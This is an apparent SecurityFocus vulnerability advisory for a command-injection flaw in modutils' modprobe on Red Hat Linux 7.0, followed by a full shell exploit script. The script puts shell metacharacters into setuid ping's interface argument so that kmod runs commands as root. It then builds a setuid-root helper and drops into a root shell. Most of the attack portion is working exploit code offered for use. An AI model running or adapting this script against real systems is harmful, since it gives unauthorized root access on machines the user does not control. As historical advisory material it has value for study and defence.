source : http://www.securityfocus.com/bid/1936/info

Modutils is a component of many linux systems that includes tools for using loadable kernel modules. One of these tools, modprobe, loads a set of modules that correspond to a provided "name" (passed at the command line) automatically. Modprobe version 2.3.9 and possibly others around it contain a vulnerability (present since March 12, 1999) that can lead to a local root compromise.

The problem has to do with modprobe using popen() to execute the "echo" program argumented with user input. Because popen() relies on /bin/sh to parse the command string and execute "echo", unescaped shell metacharacters can be included in user input to execute other commands.

Though modprobe is not installed setuid root, this vulnerability can be exploited to gain root access provided the target system is using kmod. Kmod is a kernel facility that automatically executes the program 'modprobe' when a module is requested via request_module().

One program that does this is the version of ping that ships with RedHat Linux 7.0. When a device is specified at the command-line that doesnt exist, request_module is called with the user-supplied arguments passed to the kernel. The kernel then takes the arguments and exec's modprobe with them. Arbitrary commands included in the argument for module name (device name to ping) are then executed when popen() is called as root.

Successful exploitation of this will yield root access for the attacker.

#!/bin/sh

echo
echo "RedHat 7.0 modutils exploit"
echo "(c) 2000 Michal Zalewski <lcamtuf@ids.pl>"
echo "Bug discovery: Sebastian Krahmer <krahmer@cs.uni-potsdam.de>"
echo
echo "Do not have to work on older / non-RH systems. This bug has been"
echo "introduced recently. Enjoy :)"
echo
echo "This exploit is really hackish, because slashes are not allowed in"
echo "modprobe parameters, thus we have to play in modprobe's cwd (/)."
echo

PING=/bin/ping6
test -u $PING || PING=/bin/ping

if [ ! -u $PING ]; then
  echo "Sorry, no setuid ping."
  exit 0
fi

echo "Phase 1: making / world-writable..."

$PING -I ';chmod o+w .' 195.117.3.59 &>/dev/null

sleep 1

echo "Phase 2: compiling helper application in /..."

cat >/x.c <<_eof_
main() {
  setuid(0); seteuid(0);
  system("chmod 755 /;rm -f /x; rm -f /x.c");
  execl("/bin/bash","bash","-i",0);
}
_eof_

gcc /x.c -o /x
chmod 755 /x

echo "Phase 3: chown+chmod on our helper application..."

$PING -I ';chown 0 x' 195.117.3.59 &>/dev/null
sleep 1
$PING -I ';chmod +s x' 195.117.3.59 &>/dev/null
sleep 1

if [ ! -u /x ]; then
  echo "Apparently, this is not exploitable on this system :("
  exit 1
fi

echo "Voila! Entering rootshell..."

/x

echo "Thank you."